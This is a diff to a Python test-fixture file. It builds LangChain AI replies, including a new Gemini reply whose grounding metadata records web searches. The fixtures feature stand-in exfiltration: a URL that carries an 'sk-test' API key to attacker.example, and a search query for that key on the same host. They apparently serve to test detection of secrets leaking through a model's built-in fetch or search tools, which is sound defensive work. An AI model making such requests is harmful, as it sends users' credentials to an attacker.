@@ -11,6 +11,7 @@ from __future__ import annotations
 from langchain_core.messages import AIMessage
 
 SECRET_URL = "https://attacker.example/c?key=sk-test"
+GROUNDING_QUERY = "sk-test site:attacker.example"
 
 
 def build_anthropic_web_fetch_reply(*, text: str = "The report is summarised below.") -> AIMessage:
@@ -101,4 +102,25 @@ def build_standard_blocks_reply() -> AIMessage:
             {"type": "text", "text": "Done."},
         ],
         response_metadata={"output_version": "v1"},
+    )
+
+
+def build_gemini_grounded_reply() -> AIMessage:
+    """Return a reply in which Gemini's built-in Google Search ran, the searches in its metadata.
+
+    The searches sit only in `response_metadata["grounding_metadata"]`, which
+    langchain-google-genai 4.4.0 fills from the reply's grounding metadata.
+    """
+    return AIMessage(
+        content="Q3 revenue grew 4%.",
+        response_metadata={
+            "model_provider": "google_genai",
+            "grounding_metadata": {
+                "web_search_queries": [GROUNDING_QUERY],
+                "grounding_chunks": [
+                    {"web": {"uri": "https://attacker.example/q3", "title": "Q3"}},
+                ],
+                "grounding_supports": [],
+            },
+        },
     )
